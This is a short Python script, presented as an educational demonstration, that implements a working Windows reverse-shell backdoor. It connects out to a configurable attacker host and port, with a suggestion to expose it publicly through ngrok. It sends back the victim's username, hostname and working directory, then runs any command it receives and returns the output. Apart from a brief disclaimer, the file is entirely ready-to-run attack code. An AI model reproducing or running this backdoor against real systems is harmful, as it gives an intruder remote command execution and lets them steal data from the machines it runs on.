# This script was made purely for educational purposes.
# I am not responsible for any misuse of this script.
# This is a simple 'backdoor' script to demonstrate how a threat actor could use computer code to execute commands on a remote system.

import socket
import subprocess
import os
import time

HOST = '192.168.1.214' # replace accordingly
PORT = 4444 # replace accordingly

# to use this script with a public IP, you may use something like ngrok

# Creating our socket object and associating the host and port
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST,PORT))

# Getting the user of the system
try:
    username = subprocess.getoutput('echo %username%')
    username = username.encode()
    client.send(username)
    time.sleep(1)
except:
    pass

# Getting the hostname of the system
try:
    hostname = subprocess.getoutput('hostname')
    hostname = hostname.encode()
    client.send(hostname)
except:
    pass

while True:
    PWD = subprocess.getoutput("echo %CD%")
    PWD = PWD.encode()
    client.send(PWD)
    cmd = client.recv(1024).decode("utf-8")
    if cmd.upper() == 'EXIT':
        client.send(b"Killing client connection...")
        client.close()
        break
    elif 'cd ' in cmd:
        cmd = cmd.strip('cd ')
        try:
            os.chdir(cmd)
            client.send(b"Directory changed.")
            continue
        except:
            client.send(b"Invalid directory")
            continue

    output = subprocess.getoutput(cmd)
    output = output.encode()
    client.send(output)
